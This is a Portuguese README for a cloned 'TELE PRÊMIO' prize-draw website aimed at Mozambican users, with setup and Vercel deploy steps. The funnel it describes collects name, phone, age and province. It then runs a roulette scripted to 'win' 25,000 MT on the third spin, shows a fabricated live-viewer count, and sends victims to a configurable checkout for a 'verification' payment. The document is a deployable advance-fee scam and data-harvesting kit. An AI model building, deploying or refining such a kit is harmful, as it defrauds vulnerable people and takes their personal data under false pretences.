# TELE PRÊMIO — Clone 100% Real

Clone idêntico e funcional da plataforma oficial de sorteios **TELE PRÊMIO** (em parceria com a TV SUCESSO), extraído de `https://sunny-play-button.vercel.app/`.

---

## 🚀 Como Executar Localmente

```bash
cd telepremio-clone
npm install
npm start
```

Acesse no navegador: **http://localhost:4000**

---

## 📂 Estrutura dos Arquivos

```
telepremio-clone/
├── index.html                 ← Entrypoint HTML com meta tags e OpenGraph
├── vercel.json                ← Configuração de rewrites para Vercel (SPA)
├── server.js                  ← Servidor local Express com SPA fallback
├── package.json
└── assets/
    ├── index-BE2ttAAq.js      ← Bundle React/Vite completo e interativo
    ├── index-DNmde9np.css     ← Folha de estilos oficial Tailwind v4
    ├── tele-premio-logo.jpeg  ← Logo oficial Tele Prêmio
    ├── comments.png           ← Prova social com depoimentos e comentários reais
    ├── vsl.mp4                ← Vídeo oficial VSL em alta qualidade (20.7 MB)
    ├── win.mp3                ← Efeito sonoro de comemoração e vitória
    └── favicon.ico            ← Ícone oficial do site
```

---

## 🎯 Funil Completo (Etapas Interativas)

1. **`/` (Cadastro no Sorteio)**:
   * Formulário com Nome Completo, Número de Celular (Moçambique), Idade e Província (todas as 11 províncias de Moçambique).
   * Validação em tempo real e persistência local (`localStorage`).
2. **`/premios` (Apresentação dos Prêmios)**:
   * Lista visual dos prêmios (1º: 150.000 MT, 2º: 100.000 MT, 3º: 50.000 MT, etc.).
   * Botão direto para a Roleta da Sorte.
3. **`/numero` (Roleta da Sorte Interativa)**:
   * Usuário escolhe seu número da sorte (1 a 1000).
   * Roleta visual estilizada com efeitos sonoros sintéticos (Web Audio API).
   * Sistema de 3 rodadas programadas:
     * Rodada 1 e 2: Não premiado ("Tente novamente").
     * Rodada 3: **Ganha 25.000 MT**, toca som de vitória (`win.mp3`), barra de progresso animada e redireciona automaticamente para o resultado.
4. **`/resultado` (Parabéns)**:
   * Notificação de vitória personalizada com o número escolhido e valor de 25.000 MT.
5. **`/receber` (Aviso Prévio)**:
   * Instrução de segurança alertando sobre a necessidade de assistir ao vídeo antes de resgatar.
6. **`/vsl` (Vídeo de Venda / Resgate)**:
   * Player com overlay interativo ("Seu vídeo já começou - Clique para ouvir").
   * Indicador dinâmico de participantes ao vivo (**2.847 pessoas assistindo agora**).
   * Botão de conversão com animação pulsante ("✅ FAZER A VERIFICAÇÃO").
   * Seção de comentários e prova social.

---

## 🔗 Como Configurar o Link de Checkout

O clone já vem preparado para você apontar para qualquer link de checkout que quiser:

1. **Via Parâmetro na URL (Sem editar código)**:
   * `http://localhost:4000/?checkout=https://seu-checkout.com/c/produto`
2. **Via Configuração Global no `index.html`**:
   * Adicione antes do script principal no `<head>`:
   ```html
   <script>
     window.CHECKOUT_URL = "https://mozquantumpay-original.onrender.com/checkout/demo";
     // window.CTA_DELAY = 10; // segundos para o botão aparecer no vídeo (padrão: 145)
   </script>
   ```
3. Se nada for configurado, ele usa o link padrão original (`https://goatfy.vercel.app/c/telepremio`).

---

## 🌐 Deploy na Vercel

O projeto já inclui o arquivo `vercel.json` configurado. Para colocar online na Vercel:
```bash
vercel
```
Ou conecte o repositório no painel da Vercel — ele será reconhecido como SPA estático e funcionará imediatamente em todas as rotas.
